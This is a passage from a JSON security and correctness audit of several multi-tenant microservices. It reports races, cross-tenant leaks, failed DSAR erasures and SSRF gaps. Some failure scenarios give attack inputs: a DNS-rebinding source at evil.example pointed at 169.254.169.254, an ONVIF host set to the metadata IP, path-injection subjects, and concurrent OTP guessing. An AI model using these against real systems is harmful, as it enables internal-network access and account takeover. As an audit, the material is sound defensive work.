+          "detail": "OtpService.verify() does `raw = await cache.get(key)`; `rec['attempts'] += 1`; then on a wrong code `cache.set(key, rec, ttl)`. There is no compare-and-set or atomic increment. Concurrent verify requests all read the same pre-increment `attempts` value and each re-writes attempts=old+1, so N parallel wrong guesses only advance the counter by 1 rather than N. The redis cache adapter's get/set are separate round-trips, so this race is real in production (not just the memory adapter). The single-use success path (delete on match) is also not guarded, but the practical impact is that the max_attempts (default 5) ceiling per code can be substantially exceeded by fanning out concurrent guesses, weakening the '6-digit code cannot be ground down within its short life' guarantee.",
+          "failure_scenario": "Attacker fires K concurrent POST /api/v1/otp/verify for one identifier/code each cycle; each batch reads attempts=0..4 and increments to 1..5, so many more than max_attempts guesses are consumed before the code is deleted, raising the odds of hitting the correct 6-digit code inside its TTL beyond the intended 5-in-1,000,000."
+        }
+      ]
+    },
+    {
+      "service": "job-service",
+      "issues": [
+        {
+          "category": "security",
+          "severity": "high",
+          "file": "services/job-service/app/api/v1/jobs.py",
+          "line": 79,
+          "title": "GET /api/v1/jobs/schedules leaks every tenant's schedules to any tenant reader (cross-tenant IDOR)",
+          "detail": "list_schedules is guarded by _READ (platform.jobs, jobs.manage, OR jobs.read) and calls build_scheduler(request).list(limit). Scheduler.list -> ScheduleStore.list (stores.py:136) does scan_all(_SCHEDULES) with NO tenant filter. Unlike list_jobs/dead_letters which pass _tenant(principal), this route never scopes by tenant. So a non-operator caller holding jobs.read for tenant A receives all schedules across all tenants, including their name, cron, type, and payload dict (which may carry recipient identifiers/args). Every other admin read path in this file scopes by tenant; this one does not.",
+          "failure_scenario": "A tenant-scoped user with only jobs.read for tenant 'acme' calls GET /api/v1/jobs/schedules and receives schedules belonging to tenants 'globex', 'initech', etc., including their payloads."
+        },
+        {
+          "category": "correctness",
+          "severity": "high",
+          "file": "services/job-service/app/core/job_service.py",
+          "line": 75,
+          "title": "claim() lease is not atomic — concurrent claims double-lease the same job (double execution)",
+          "detail": "The module docstring promises 'no double-execution — a claim atomically moves a job queued->leased'. But claim() does `job = await self._jobs.get(...)` then checks `job.status != QUEUED` then `await self._jobs.save(job)` with a fresh lease_token. There are await points between the read and the conditional write, and JobStore.save -> DataStore.put is an unconditional overwrite (no compare-and-swap; see memory.py:22 and postgres.py:116 put, and datastore port has no CAS/SELECT FOR UPDATE). Two /internal/jobs/claim requests (two workers, the intended topology) interleave: both get() the same QUEUED job, both pass the status check, both save LEASED with different lease_tokens, both append it to their claimed list. Two workers now hold valid-looking leases on one job and both execute it. The fencing token does not help — each worker got a token from its own successful save.",
+          "failure_scenario": "Two worker processes call POST /internal/jobs/claim concurrently while one due job exists; both receive that job with distinct lease_tokens and both run it (e.g. a 'charge customer' job runs twice)."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "services/job-service/app/core/job_service.py",
+          "line": 43,
+          "title": "enqueue() idempotency/unique check is racy — concurrent same-key enqueues create duplicate jobs",
+          "detail": "enqueue() does unique_get(key) (returns None if absent) then later unique_put(key, job.id). There is no atomic put-if-absent; unique_put (stores.py:113) is an unconditional overwrite. Two concurrent enqueues with the same idempotency_key both see unique_get -> None, both create a new Job with a new id, both save, both index_due, and the second unique_put simply overwrites the first mapping. The stated guarantee 'a retried enqueue (same idempotency_key) returns the existing job, not a duplicate' fails under concurrency, producing two jobs for one intended unit of work.",
+          "failure_scenario": "A caller retries POST /internal/jobs/enqueue with idempotency_key=X while the first request is still in flight; both succeed and two identical jobs are queued and executed."
+        },
+        {
+          "category": "security",
+          "severity": "medium",
+          "file": "services/job-service/app/api/v1/jobs.py",
+          "line": 138,
+          "title": "GET /api/v1/jobs/stats returns global cross-tenant counts to any tenant reader",
+          "detail": "The /stats route is guarded by _READ (includes jobs.read) but calls build_jobs(request).stats() with no tenant argument. JobService.stats (job_service.py:224) calls JobStore.counts() which scan_all's the entire jobs table across all tenants, plus due_index totals. A tenant-scoped reader thus learns fleet-wide job counts by status, dead-letter totals, and oldest-pending age for the whole platform, not just their own tenant.",
+          "failure_scenario": "A user with jobs.read for one tenant calls GET /api/v1/jobs/stats and infers other tenants' backlog/failure volume from the global by_status and dead_letters counts."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "services/job-service/app/api/v1/jobs.py",
+          "line": 118,
+          "title": "replay/cancel record a success-shaped audit event before (and regardless of) the actual outcome, under the operator's own tenant",
+          "detail": "replay (line 118) and cancel (line 131) call auditor.record('job.replayed'/'job.cancelled') BEFORE invoking the service, and the service call may return {ok:false, reason:'not_found'|'not_dead'|'not_cancelable'} without mutating anything. So an audit record asserting the action happened is written even when it did not — a tenant caller can probe arbitrary job_ids and generate 'job.replayed'/'job.cancelled' audit entries for jobs that don't exist or that they don't own (the ownership check lives inside the service and returns not_found silently). Additionally, the audit uses tenant=principal.tenant: when a platform operator (is_operator=True) replays/cancels another tenant's job, the event is logged under the operator's own tenant (or None), not the job's tenant, so the cross-tenant action is misattributed. Same misattribution in delete_schedule (line 90).",
+          "failure_scenario": "A tenant user POSTs /api/v1/jobs/<random_id>/cancel; an audit 'job.cancelled' event is recorded although the service returns not_found and nothing changed, polluting the audit trail with fabricated actions."
+        }
+      ]
+    },
+    {
+      "service": "notification-service",
+      "issues": [
+        {
+          "category": "vuln",
+          "severity": "high",
+          "file": "app/core/erasure.py",
+          "line": 70,
+          "title": "DSAR erasure never strips delivery records — recipient PII retained forever after erasure",
+          "detail": "erase() strips deliveries with find(_DELIVERIES, {\"tenant\": tenant, \"to\": subject}, sort=(\"created\",\"asc\")) and then sets r[\"to\"]/r[\"body\"]/r[\"subject_line\"]. But the Delivery model (app/core/models.py:105-113) stores the recipient under the field name \"recipient\", never \"to\", and has no \"body\"/\"subject_line\" fields at all (message content/PII also lives in Delivery.payload, which contains 'recipient' and 'variables'). Both datastores do pure equality matching (memory.py:29-38 `_matches`; postgres.py:169 `value @> {\"to\": subject}`), so the where clause `{\"to\": subject}` matches ZERO delivery rows for any real subject. Result: on a compliance DSAR erasure, the customer's raw phone/email in Delivery.recipient and Delivery.payload is NEVER pseudonymised or stripped — it is retained indefinitely. The module docstring and ack claim the recipient is pseudonymised and content stripped, so the DSAR is answered falsely.",
+          "failure_scenario": "compliance-service calls POST /internal/privacy/erase for a WhatsApp customer whose only data is delivery rows (no prefs/feed). The delivery strip loop matches nothing (field 'to' does not exist; real field is 'recipient'), stripped stays 0, retained=[], already_absent=True is returned. The customer's raw phone number and message variables remain in the 'deliveries' collection permanently, and the DSAR reports the subject as already absent."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/stores.py",
+          "line": 209,
+          "title": "Idempotency dedupe is a read-then-write TOCTOU with no atomic put-if-absent — concurrent duplicate sends",
+          "detail": "notify()/send_interactive()/send_carousel() dedupe by calling DeliveryStore.idempotent_get() at the start and DeliveryStore.remember_idempotent() only after a terminal success (notifier.py:92-96, _finish at 409-417). idempotent_get does store.get and remember_idempotent does store.put; there is no atomic compare-and-set primitive in the DataStore port (datastore.py exposes only get/put/find, no put_if_absent). Two concurrent requests carrying the same idempotency_key both miss the get, both proceed to _deliver, and both create a distinct Delivery (new_id per _record) and send. The dedupe only protects a *sequential* retry, not concurrent at-least-once callers, which is exactly the scenario (a caller retry racing the original, or two pods) the dedupe was added to stop.",
+          "failure_scenario": "A caller sends two /internal/notify requests with the same idempotency_key within the send latency window (retry fires before the first completes). Both pass idempotent_get (nothing stored yet), both send the OTP SMS/WhatsApp — the customer receives two messages and the tenant is billed twice, defeating the stated 'duplicate OTP SMS costs money' guarantee."
+        },
+        {
+          "category": "perf",
+          "severity": "medium",
+          "file": "app/adapters/datastore/postgres.py",
+          "line": 33,
+          "title": "Append-only catch-up logs sort on fields the shipped btree index does not cover — each page scans the whole log",
+          "detail": "The only ordering index shipped is kv_created_desc on (collection, COALESCE(value->>'created','') DESC, key DESC). The append-only, unbounded-growth catch-up logs order by other fields: DeliveryStore.changed_since sorts ('receipt_ts','asc') over {'kind':'receipt'} (stores.py:195), InboundStore.changed_since sorts ('timestamp','asc') (stores.py:256), and the three CoexistenceStore *_since / purge_expired sort ('timestamp'|'expires_at') (stores.py:333-353). Each of these filters on a CONSTANT partition key (kind), so the GIN containment matches EVERY row in the log, and because the ORDER BY expression (value->>'receipt_ts' etc.) does not match the btree index expression (value->>'created'), Postgres cannot seek: it reads all matching rows and top-N sorts them for every cursor page — the exact O(all rows) pathology the adapter's own comment (lines 24-30) warns about. As the receipt/inbound/coexistence logs grow, every consumer catch-up page and every retention purge degrades linearly.",
+          "failure_scenario": "A high-volume tenant accumulates millions of receipt rows. A consumer paging /internal/notifications/receipts (limit 200) causes Postgres to bitmap-scan and sort all receipt rows on each page instead of a keyset seek, so catch-up reconciliation latency grows with total log size and can time out / starve the pool."
+        }
+      ]
+    },
+    {
+      "service": "onboarding-service",
+      "issues": [
+        {
+          "category": "bug",
+          "severity": "high",
+          "file": "app/adapters/entitlement/wallet.py",
+          "line": 58,
+          "title": "Welcome-credit expiry is silently dropped — promo grants never lapse",
+          "detail": "The adapter only sets an expiry via body['expires_at'] = request.metadata.get('expires_at'), but GrantService.issue() builds the GrantRequest with metadata={'once_per': once_per} and never puts 'expires_at' in metadata (grants.py:99). The configured `days` (spec.get('days')) is used only as the gate `if request.days:` and is never converted to an absolute instant anywhere. So whenever a grant has days>0 configured, the wallet credit is sent with expires_at=None (or omitted), meaning wallet-service's sweep-grants job can never reclaim it. The docstring's promise ('expires_at makes it a grant rather than a gift ... computing it here keeps the expiry in one place') is unimplemented.",
+          "failure_scenario": "A flow grants a 90-day welcome credit (spec has amount+days=90). Customer claims it. The wallet Grant is created with no expires_at, so it never lapses and the nightly sweep never claws back the unspent remainder. Every welcome credit becomes a permanent, unbounded promotional liability — the exact drain the design set out to prevent."
+        },
+        {
+          "category": "bug",
+          "severity": "high",
+          "file": "app/core/saga.py",
+          "line": 125,
+          "title": "Resume of failed compensation loses the reference and silently abandons cleanup",
+          "detail": "When an undo raises, _compensate records only {'step': step.name, 'error': str(exc)} — it drops step.result (the created resource's reference). ProvisioningService.resume() then calls provisioner.undo(request, entry.get('reference', '')) with an EMPTY reference (provisioning.py:147). HttpProvisioner.undo returns ProvisionResult(status=CREATED, detail='nothing was created') when reference is empty (provisioner/http.py:57-58), whose .ok is True (ports/provisioner.py:55). resume() therefore treats the undo as successful and drops the entry from the still-unfinished list, marking the run clean while the downstream resource (tenant/membership) was never actually deleted.",
+          "failure_scenario": "Provisioning creates a tenant then a membership; membership create fails; the tenant undo fails because wallet/tenant-service is briefly down, so the tenant lands in 'unfinished' (without its reference). Operator later calls /admin/resume/{subject}. resume passes an empty reference, undo no-ops as 'nothing was created', resume reports resumed=True with empty unfinished — and the orphan tenant survives forever, with the record now claiming rollback is complete."
+        },
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "app/adapters/entitlement/wallet.py",
+          "line": 58,
+          "title": "Grant scope default diverges between issue (tenant) and satisfaction check (user)",
+          "detail": "claim_grant issues with scope=spec.get('scope','tenant') (api/v1/onboarding.py:112) and GrantService.mark_granted stores the local fact under a tenant-scoped key when scope=='tenant' (local_facts.py:52). But LocalFacts.check resolves scope with `tenant if req.get('scope')=='tenant' else f'{tenant}:{subject}'` (local_facts.py:38), defaulting to SUBJECT scope. For a grant requirement that declares no explicit scope, the grant fact is WRITTEN at key 'req::tenant' but READ at key 'req::tenant:subject' — the two never meet.",
+          "failure_scenario": "A flow has a requirement with grants set but no scope field. Customer claims the grant: the wallet credit is issued and the ledger records it, mark_granted writes the tenant-scoped key. On the next /next call the requirement is re-evaluated, LocalFacts.check reads the subject-scoped key, finds nothing, and reports it UNSATISFIED. The flow permanently shows the gift as outstanding; re-claiming hits the ledger dedupe (ALREADY) but still never flips the requirement satisfied."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/erasure.py",
+          "line": 63,
+          "title": "DSAR erasure never matches onboarding_grants rows — subject data silently retained",
+          "detail": "erase() filters onboarding_grants with where={'tenant':tenant,'subject':subject}, but LocalFacts.mark_granted writes rows containing only {'id','reference','at'} — no 'tenant' and no 'subject' fields (local_facts.py:53). Both MemoryDataStore.find and PostgresDataStore.find match on row field equality/containment, so the filter matches zero rows. The granted local facts (whose key embeds subject for user-scoped grants) are never deleted, never listed under erased[], and never declared under retained[] — exactly the silent-hide the erasure contract forbids.",
+          "failure_scenario": "A subject with user-scoped onboarding grants requests erasure via /internal/privacy/erase. The onboarding_grants rows are left in place, the ack omits them from both 'erased' and 'retained', and if there were also no forced rows the response reports already_absent=true — a false 'she was erased' while personal-data-linked rows remain."
+        },
+        {
+          "category": "security",
+          "severity": "medium",
+          "file": "app/adapters/requirement_source/http.py",
+          "line": 39,
+          "title": "Unencoded tenant/subject/fact interpolated into internal requirement-check URL",
+          "detail": "check() builds the URL by raw string substitution: path.replace('{fact}',fact).replace('{tenant}',tenant).replace('{subject}',subject) then base+path, with no URL/percent encoding (requirement_source/http.py:39-41). subject is attacker-influenced on the admin tier (/admin/inspect takes subject as a caller-supplied query param), and generally comes from token claims. A value containing '/', '?', '#', or '..' rewrites the request path or appends query params to the owning service's internal endpoint (CWE-88/CWE-918-adjacent request-path injection).",
+          "failure_scenario": "An operator (or a crafted subject claim) with value like '../admin/verified?force=1' or 'x?override=true' is substituted directly into the verification-service internal URL, redirecting the requirement check to a different internal path/query than intended and potentially returning a satisfied answer for a requirement that is not actually met."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/adapters/datastore/postgres.py",
+          "line": 200,
+          "title": "Keyset pagination cursor uses value['id'] but ORDER BY tie-breaks on row key",
+          "detail": "find() orders and compares by (COALESCE(value->>field,''), key) — the row's primary-key column — but encodes the next cursor from last.get('id') taken from the JSON value (postgres.py:200; MemoryDataStore has the same shape at memory.py:70). When a row's stored 'id' field is not identical to its storage key, the cursor's tie-break value no longer matches the ORDER BY tie-break column, so the tuple comparison on the next page can skip or duplicate rows sharing a sort-field value.",
+          "failure_scenario": "A collection is paginated where key != value['id'] and several rows share the same sort field (e.g. same 'created'); the second page's cursor comparison against `key` uses the mismatched id, dropping or repeating rows at the page boundary during a sweep or export."
+        }
+      ]
+    },
+    {
+      "service": "search-service",
+      "issues": [
+        {
+          "category": "correctness",
+          "severity": "critical",
+          "file": "services/search-service/app/core/erasure.py",
+          "line": 37,
+          "title": "DSAR subject erasure is a silent no-op (wrong collection) — index keeps erased persons",
+          "detail": "SearchErasure.erase() queries the datastore collection _DOCS = \"documents\" (line 21) via store.find(\"documents\", {\"tenant\":..,\"owner\":..}). But the actual index writes documents to a DIFFERENT collection: BuiltinIndex uses _DOCS = \"search_docs\" (adapters/index/builtin.py line 15, key \"<index>:<doc_id>\"). The \"documents\" collection is never written by this service, so find() always returns zero rows. The erase therefore deletes nothing, and even if the collection name matched it deletes only the raw doc row via store.delete and never scrubs the inverted-index postings (search_postings) or meta, so the person's terms remain fully searchable. Worse, the ack returns already_absent=True / erased=[] falsely reporting a successful erasure to compliance-service.",
+          "failure_scenario": "compliance-service fans out a DSAR erase for tenant T subject S whose name was indexed. POST /internal/privacy/erase returns {\"erased\":[],\"already_absent\":true} while a subsequent POST /api/v1/search for S's name still returns the document. GDPR/PDPL right-to-erasure is violated and the audit trail records a completed erasure that never happened."
+        },
+        {
+          "category": "vuln",
+          "severity": "high",
+          "file": "services/search-service/app/adapters/index/builtin.py",
+          "line": 28,
+          "title": "Cross-tenant document overwrite/hijack: storage key omits tenant",
+          "detail": "Documents are stored under _dk(index, doc_id) = f\"{index}:{doc_id}\" (lines 28-29) with tenant only a field inside the record, not part of the key; postings are keyed (index, term) too. On upsert, _remove_existing (lines 35-48) deletes any existing record with that (index, doc_id) regardless of its tenant, then writes the new record under the caller's tenant. The internal /search/index route (api/internal.py lines 99-108) lets any authenticated peer choose both index and tenant freely. Two tenants sharing an index name and a doc id collide: a peer indexing for tenant A can silently destroy or re-own tenant B's document. The read path filters by tenant so this is not a read leak, but it is cross-tenant data loss / record hijacking on the write path.",
+          "failure_scenario": "Tenant B has doc index=\"contacts\", id=\"c-100\". A peer indexing for tenant A calls POST /internal/search/index with index=\"contacts\", id=\"c-100\", tenant=\"A\". _remove_existing wipes B's postings/meta and the record is rewritten with tenant=A; B's document is gone (and B's document count in meta is corrupted)."
+        },
+        {
+          "category": "vuln",
+          "severity": "high",
+          "file": "services/search-service/app/core/search_service.py",
+          "line": 71,
+          "title": "Internal delete ignores tenant — cross-tenant document deletion",
+          "detail": "SearchService.delete(index, doc_id, tenant) (lines 71-74) calls self._index.delete(index=index, doc_id=doc_id) with NO tenant, and BuiltinIndex.delete -> _remove_existing (builtin.py lines 65-66, 35-48) removes by (index, doc_id) only. The DeleteIn body (api/internal.py lines 40-43, 120-128) requires a tenant but it is never used to verify the target record actually belongs to that tenant. Any internal peer can delete another tenant's document by supplying the right index+id (entity ids are often predictable), causing cross-tenant data loss.",
+          "failure_scenario": "A peer acting for tenant A calls POST /internal/search/delete {index:\"orders\", id:\"o-42\", tenant:\"A\"} where o-42 actually belongs to tenant B. The tenant field is ignored and B's document is deleted."
+        },
+        {
+          "category": "vuln",
+          "severity": "high",
+          "file": "services/search-service/app/api/ratelimit.py",
+          "line": 81,
+          "title": "Rate limiting fully built but wired to zero routes",
+          "detail": "build_policy/register_ratelimit_refund and the rate_limit dependency are constructed in main.py (lines 122-124) and defined here, but grep shows no route anywhere adds Depends(rate_limit) — not the user search/suggest routes (api/v1/search.py) nor the internal routes (api/internal.py). No middleware enforces it either. The entire limiter (including the RateLimit-* headers and fail-closed logic) is dead code, so every endpoint, including the expensive unbounded search path, is unthrottled. (The file header even still says \"identity-service\", a copy-paste indicator.)",
+          "failure_scenario": "An authenticated caller floods POST /api/v1/search with broad queries; nothing rate-limits them and the per-query cost (see the unbounded-candidate finding) amplifies into a service-wide DoS."
+        },
+        {
+          "category": "perf",
+          "severity": "high",
+          "file": "services/search-service/app/core/search_service.py",
+          "line": 130,
+          "title": "Unbounded candidate materialization on the search hot path (DoS)",
+          "detail": "_run builds candidate_tf as the full union of every term's posting list (lines 119-125), then loops over ALL candidates doing one datastore get per candidate (line 131), ranks all of them, and only paginates AFTER (lines 142-146). The only cost limits are query length and term count (core/query.py); there is no cap on posting-list size or candidate count. A single common term matching millions of docs triggers millions of per-doc datastore reads and full in-memory ranking per request. Because postings are shared across tenants in an index, a query also fetches other tenants' matching docs (filtered out at line 132) — pure read amplification. Combined with the missing rate limiter this is an easy DoS.",
+          "failure_scenario": "A tenant on a large shared index searches a single high-frequency term; the request reads and ranks the entire posting union (all tenants' matching docs) before returning one page, spiking latency/memory and blocking the single-worker event loop."
+        },
+        {
+          "category": "perf",
+          "severity": "medium",
+          "file": "services/search-service/app/adapters/index/builtin.py",
+          "line": 77,
+          "title": "suggest() scans up to 1,000,000 rows of the whole corpus on a user hot path",
+          "detail": "iter_docs (lines 77-79) calls self._store.list(_DOCS, _SCAN) with _SCAN = 1_000_000 (line 18), i.e. scan_all across ALL indexes and ALL tenants, pulling up to a million records into memory, THEN filters by index and slices [:limit]. This runs on the user-facing GET /api/v1/search/suggest and internal /search/suggest for every keystroke-style autocomplete call. The 'bounded by list_limit' claim in SearchService.suggest is false at the store layer — list_limit is applied only after the million-row read. On postgres this is a LIMIT 1000000 heap read per call.",
+          "failure_scenario": "Autocomplete on a service with a large search_docs collection: each /search/suggest request loads up to 1M rows into the process, causing memory pressure and multi-second latency; a few concurrent typers exhaust the worker."
+        },
+        {
+          "category": "security",
+          "severity": "medium",
+          "file": "services/search-service/app/api/v1/search.py",
+          "line": 75,
+          "title": "Index stats/catalogue leak global cross-tenant counts despite documented tenant re-scoping",
+          "detail": "GET /api/v1/search/indexes and GET /api/v1/search/indexes/{index}/stats are gated by _ADMIN = platform.search OR search.manage. search.manage is documented as a tenant-scoped operator capability (user_actions.py: 're-scopes to the caller's tenant on every call'), but the code does no tenant scoping: SearchService.stats/list_indexes (search_service.py lines 212-217) and BuiltinIndex.stats/list_indexes (builtin.py lines 74-88) return the global meta rows — index names across all tenants and aggregate n_docs/total_len that count every tenant's documents in a shared index. A tenant operator thus learns other tenants' index names and document volumes, and the documented isolation invariant is violated.",
+          "failure_scenario": "A tenant admin holding search.manage calls GET /api/v1/search/indexes and sees every index name in the platform plus global document counts, and /indexes/{index}/stats returns n_docs including other tenants' docs."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "services/search-service/app/core/search_service.py",
+          "line": 145,
+          "title": "Reported total shrinks across pages (computed after cursor filtering)",
+          "detail": "In _run, when a cursor is supplied, ordered is filtered to only hits AFTER the cursor position (lines 143-144) and THEN total = len(ordered) (line 145). So 'total' is the number of REMAINING results, not the total match count. Each subsequent page reports a smaller total, breaking clients that render 'N results' or compute page counts from total; next_cursor's guard (total > size, line 156) is also evaluated against the shrunken value.",
+          "failure_scenario": "A query with 100 matches and size=20: page 1 reports total=100, page 2 reports total=80, page 3 total=60, etc., so any UI or caller using total for pagination math is wrong on every page after the first."
+        }
+      ]
+    },
+    {
+      "service": "stream-service",
+      "issues": [
+        {
+          "category": "security",
+          "severity": "high",
+          "file": "app/core/stream_service.py",
+          "line": 128,
+          "title": "SSRF DNS-rebinding: validated/pinned IP is discarded; ffmpeg connects by hostname",
+          "detail": "validate_source_url() (app/core/ssrf.py:66) resolves the host, blocks metadata/private/loopback IPs, and RETURNS a Resolved(ip=...) so the caller can pin the connection — the module docstring explicitly promises 'the caller can PIN the connection to it (DNS-rebinding safe)'. But StreamService._check_ssrf (line 354) throws the return value away, and start_session/probe_source pass the original hostname URL (spec.source_url = url) to the engine. FfmpegStreamEngine._input_args/probe (app/adapters/stream/ffmpeg_engine.py:38,140) invoke ffmpeg/ffprobe with '-i <hostname-url>', so ffmpeg does its OWN DNS resolution at connect time. The validation and the connection resolve the name independently.",
+          "failure_scenario": "Attacker (tenant operator) registers a source at http://evil.example/. evil.example resolves to a public IP during register_source and start_session validation (passes), then flips its DNS A record to 169.254.169.254 (or 10.x internal). When ffmpeg opens the URL milliseconds later it re-resolves to the internal/metadata IP and the stream engine proxies cloud-metadata / internal services. The whole point of the SSRF guard (re-validate at connect time, rebinding-safe) is defeated because the connection is never pinned to the validated IP."
+        },
+        {
+          "category": "security",
+          "severity": "medium",
+          "file": "app/core/stream_service.py",
+          "line": 95,
+          "title": "onvif.host is never SSRF-validated; PTZ connects to an arbitrary host",
+          "detail": "register_source SSRF-validates only `url` (self._check_ssrf(url)); the caller-supplied `onvif` dict (SourceIn.onvif in app/api/v1/stream.py:63) is stored verbatim (models.py:45). PTZ routes call _ptz_source() which returns src.onvif, and OnvifPtzController._default_factory (app/adapters/stream/onvif_ptz.py:22) does ONVIFCamera(onvif.get('host'), int(onvif.get('port',80)), ...) — an HTTP client to that host:port. No validate_source_url is ever applied to onvif.host, so the SSRF guard that protects `url` is fully bypassed via the onvif field.",
+          "failure_scenario": "A tenant with stream.manage registers a source with onvif={'host':'169.254.169.254','port':80} and calls POST /sources/{id}/ptz/move or /ptz/presets. The service issues HTTP requests to the cloud-metadata endpoint (or any internal host/port), turning an authenticated operator action into an internal-network / metadata SSRF — exactly what the SSRF module exists to prevent for operator-supplied source targets."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/stream_service.py",
+          "line": 349,
+          "title": "Global concurrency cap (STREAM_MAX_CONCURRENT_SESSIONS_GLOBAL) is advertised but never enforced",
+          "detail": "StreamConfig stores max_concurrent_global (line 63) from STREAM_MAX_CONCURRENT_SESSIONS_GLOBAL (config.py:469, wired in app/api/v1/stream.py:39), but _enforce_quota (line 349-352) only checks max_concurrent_per_tenant via count_live_for_tenant. There is no count_live_global / global check anywhere (grep confirms max_concurrent_global has no reader). The knob is a no-op.",
+          "failure_scenario": "Operator sets STREAM_MAX_CONCURRENT_SESSIONS_GLOBAL=100 expecting a fleet-wide ceiling. With N tenants each allowed their per-tenant cap, total live sessions (each an ffmpeg process) grows without bound past the intended global limit, exhausting node CPU/memory/FDs — a resource-exhaustion DoS the operator believes is capped but is not."
+        },
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "app/core/stream_service.py",
+          "line": 121,
+          "title": "Concurrency quota is check-then-create (TOCTOU); cap can be exceeded under concurrent starts",
+          "detail": "start_session calls await self._enforce_quota(tenant) (line 121), which does count_live_for_tenant(...) >= cap, and only later awaits self._sessions.create(sess) (line 149). The count and the create are separate awaits with no atomic reservation/CAS. The same non-atomic gap exists for one_session_per_source (line 122-125: list_for_tenant then create).",
+          "failure_scenario": "A tenant at cap-1 live sessions fires K concurrent POST /sessions requests. Each coroutine reads count = cap-1 (< cap) before any create commits, all pass the guard, and all create sessions — leaving cap-1+K live sessions, over the per-tenant limit (and, with one_session_per_source, two live sessions on the same camera). Quota/billing/resource limits are silently breached."
+        },
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "app/core/recording.py",
+          "line": 45,
+          "title": "RecordingShipper has no lease/lock: concurrent sweeps double-ship segments and lose appends",
+          "detail": "ship_session lists rec_* files, then for each: reads bytes, put_segment to the sink, appends {ref,...} to rec.segments and rec.total_bytes, os.remove(local), and finally recordings.save(rec) (lines 34-72). Dedup relies solely on os.remove having deleted the local file. The /internal/stream/sweep endpoint (api/internal.py:76) calls ship_live_recordings with no locking, and it is CronJob/multi-replica driven. Two concurrent runs list the same not-yet-removed segments, both put_segment + append, and the two RecordingStore.save() calls are last-write-wins (get→append→put, no CAS in stores.py:104).",
+          "failure_scenario": "Two sweep replicas (or an overlapping cron) run concurrently: the same segment is uploaded twice and appended twice (duplicate segments / inflated total_bytes), OR the two get→append→save races drop one run's appended segments entirely (lost recording data). Also, if os.remove fails (OSError is swallowed, line 67-68) the segment re-ships on the next run regardless."
+        },
+        {
+          "category": "perf",
+          "severity": "low",
+          "file": "app/core/stores.py",
+          "line": 120,
+          "title": "Retention sweep scans the entire non-locked recordings table every run",
+          "detail": "iter_expired queries find(_RECORDINGS, {'locked': False}, sort=('started','asc')) and filters started < cutoff in Python (line 124-126). enforce_retention (stream_service.py:221-233) pages until cursor is exhausted. Because expired rows sort to the FRONT (asc), once a page crosses the cutoff every remaining row is non-expired, yet the loop keeps paging through all non-locked recordings — there is no early break when r['started'] >= cutoff.",
+          "failure_scenario": "With a large recordings table, each retention run reads the full non-locked collection page by page even though only the oldest few are expired, wasting datastore reads/latency that grows unbounded with retained history."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/core/exporting.py",
+          "line": 57,
+          "title": "Export range limit bypassable with non-ISO start/end timestamps",
+          "detail": "request() checks `end <= start` as a lexicographic string compare, then span = _span_seconds(start,end) and rejects span > max_range_seconds. _span_seconds (line 209-217) returns 0.0 on any parse failure. So non-ISO strings where end > start lexically (e.g. start='a', end='z') pass end<=start, yield span=0.0, and skip the EXPORT_MAX_RANGE_SECONDS check entirely; the row is created and enqueued.",
+          "failure_scenario": "A caller submits malformed start/end that pass the string ordering check; the range cap is silently not applied. Impact is limited (worker segment matching also uses string compare and finds no footage, producing an empty/failed export), but the documented safety limit is not enforced and unvalidated ranges reach the worker."
+        }
+      ]
+    },
+    {
+      "service": "tenant-service",
+      "issues": [
+        {
+          "category": "correctness",
+          "severity": "high",
+          "file": "app/core/tenant_service.py",
+          "line": 176,
+          "title": "close_sweep reads only the first `limit` tenants, so scheduled tenant erasures beyond that window are NEVER performed",
+          "detail": "close_sweep() calls self._repo.list(limit) which is store.scan_all('tenants', limit) — a bounded read of the FIRST `limit` rows in a deterministic order (postgres: ORDER BY key; memory: insertion order), NOT a query for tenants that are actually closing. It then filters that fixed prefix for status==SUSPENDED with an elapsed grace_until. The internal route POST /internal/tenants/close-sweep (app/api/internal.py:148-154) invokes it with the default limit=200 and no cursor/pagination. The docstring claims a deployment with more closing tenants than `limit` 'simply finishes them on the next pass', but every pass re-reads the SAME first `limit` rows, so a closing tenant whose key sorts after position `limit` is read on no pass and is never erased. Owner self-close (svc.close) promises erasure after the grace window; this silently breaks that guarantee and leaves suspended tenants' data retained indefinitely — a GDPR/data-retention failure that no test or metric surfaces.",
+          "failure_scenario": "Platform has 500 active tenants (keys sorted). Tenant whose key sorts at position 300 self-closes; grace elapses. Every scheduled close-sweep reads tenants at key-positions 1-200 only, never sees the closed tenant, returns erased=0 for it forever. Its data is retained permanently despite the completed close request."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/tenant_repository.py",
+          "line": 25,
+          "title": "Slug/domain uniqueness is check-then-put with an await gap (TOCTOU), so concurrent provisions of the same slug/domain both succeed",
+          "detail": "create() does `if await store.get(_SLUGS, slug) is not None: raise SlugTaken` and then, after several awaits, `store.put(_SLUGS, slug, {id})`. There is no atomic put-if-absent / CAS. Between the get and the put the event loop yields, so two concurrent provision calls (POST /api/v1/tenants or POST /internal/tenants) for the same slug can both observe the slug as free, both write distinct tenant rows under new ids, and both write the slug index — the second overwrites the first. Result: two tenant rows exist for one slug, the slug index resolves to only one, and the other tenant row is orphaned (unreachable by slug/domain). The same race applies to the domain index (domain hijack: two tenants both claim a custom host). The comment in api/internal.py claims 'slug uniqueness IS the idempotency', but this non-atomic check cannot enforce it under concurrency.",
+          "failure_scenario": "Onboarding retries fire two concurrent POST /internal/tenants with slug='acme'. Both pass the get()==None check, both put tenant rows (id A, id B), both put tenant_slugs['acme']; B wins. Tenant A is now an orphaned, billable-but-unroutable registry row; the domain index can likewise be reassigned to a second tenant."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/api/v1/tenants.py",
+          "line": 160,
+          "title": "Lifecycle audit is written ahead of the existence check, recording delete/suspend/reactivate events for tenants that were never mutated",
